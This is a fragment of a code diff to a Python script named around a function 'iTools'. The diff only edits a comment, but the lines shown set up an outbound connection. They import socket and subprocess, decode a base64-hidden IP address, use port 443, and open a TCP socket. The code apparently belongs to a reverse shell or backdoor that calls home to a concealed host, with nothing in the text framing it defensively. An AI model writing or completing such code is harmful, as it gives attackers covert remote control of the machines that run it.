@@ -5,7 +5,7 @@
 import socket,base64,os,subprocess as sp, sys
 
 def iTools():
-    ip = 'MTAuMjU0LjEwNy4xMjI=' #Ip Crypt
+    ip = 'MTAuMjU0LjEwNy4xMjI=' #Decrypt IP menggunakan iTBase64
     PORT = 443 #PORT
     HOST = base64.b64decode(ip)
     sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
